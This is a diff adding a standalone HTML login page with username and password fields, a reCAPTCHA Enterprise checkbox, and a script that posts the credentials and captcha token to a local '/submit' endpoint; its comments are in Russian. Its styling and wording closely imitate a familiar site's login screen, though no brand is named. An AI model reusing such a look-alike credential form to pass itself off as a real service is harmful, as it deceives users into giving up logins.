@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Login</title>
+
+    <!-- ВАЖНО: без ?render -->
+    <script src="https://www.google.com/recaptcha/enterprise.js" async defer></script>
+
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, sans-serif;
+            background: #f6f7f8;
+        }
+
+        .card {
+            width: 360px;
+            background: white;
+            border-radius: 12px;
+            padding: 28px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+        }
+
+        h2 {
+            margin: 0 0 10px;
+            text-align: center;
+        }
+
+        .subtext {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-bottom: 18px;
+            line-height: 1.4;
+        }
+
+        .subtext a {
+            color: #2a6ef2;
+            text-decoration: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 10px;
+            border-radius: 999px;
+            border: 1px solid #ddd;
+            background: white;
+            margin-bottom: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .btn:hover {
+            background: #f3f3f3;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 14px 0;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e5e5e5;
+        }
+
+        .divider span {
+            padding: 0 10px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #2a6ef2;
+        }
+
+        .link {
+            font-size: 12px;
+            color: #2a6ef2;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .submit {
+            width: 100%;
+            padding: 10px;
+            border-radius: 999px;
+            border: none;
+            background: #dfe3e6;
+            color: #888;
+            cursor: not-allowed;
+            font-weight: bold;
+        }
+
+        .submit.active {
+            background: #ff4500;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .captcha {
+            margin-bottom: 12px;
+            display: flex;
+            justify-content: center;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="card">
+
+    <h2>Log In</h2>
+
+    <div class="subtext">
+        By continuing, you agree to our
+        <a href="#">User Agreement</a> and
+        acknowledge that you understand the
+        <a href="#">Privacy Policy</a>.
+    </div>
+
+    <button class="btn">🔗 Email me a one-time link</button>
+
+    <div class="divider"><span>OR</span></div>
+
+    <form id="myForm">
+
+        <input type="text" name="username" placeholder="Email or username *" required/>
+        <input type="password" name="password" placeholder="Password *" required/>
+
+        <a class="link" href="#">Forgot password?</a>
+
+        <!-- reCAPTCHA checkbox -->
+        <div class="captcha">
+            <div class="g-recaptcha"
+                 data-sitekey="6LepptQsAAAAANTbce8O04lehcqWBsMAFRdeVwuG"
+                 data-callback="onRecaptchaSuccess"
+                 data-expired-callback="onRecaptchaExpired">
+            </div>
+        </div>
+
+        <button class="submit" type="submit">Log In</button>
+    </form>
+
+</div>
+
+<script>
+    let recaptchaToken = null;
+
+    function onRecaptchaSuccess(token) {
+        recaptchaToken = token;
+
+        const btn = document.querySelector(".submit");
+        btn.classList.add("active");
+        btn.disabled = false;
+    }
+
+    function onRecaptchaExpired() {
+        recaptchaToken = null;
+
+        const btn = document.querySelector(".submit");
+        btn.classList.remove("active");
+        btn.disabled = true;
+    }
+
+    document.getElementById("myForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        if (!recaptchaToken) {
+            alert("Подтверди, что ты человек");
+            return;
+        }
+
+        const formData = new FormData(e.target);
+        formData.append("token", recaptchaToken);
+
+        try {
+            const response = await fetch("/submit", {
+                method: "POST",
+                body: formData
+            });
+
+            const text = await response.text();
+            alert(text);
+        } catch (err) {
+            alert("Ошибка запроса");
+        }
+    });
+</script>
+
+</body>
+</html>
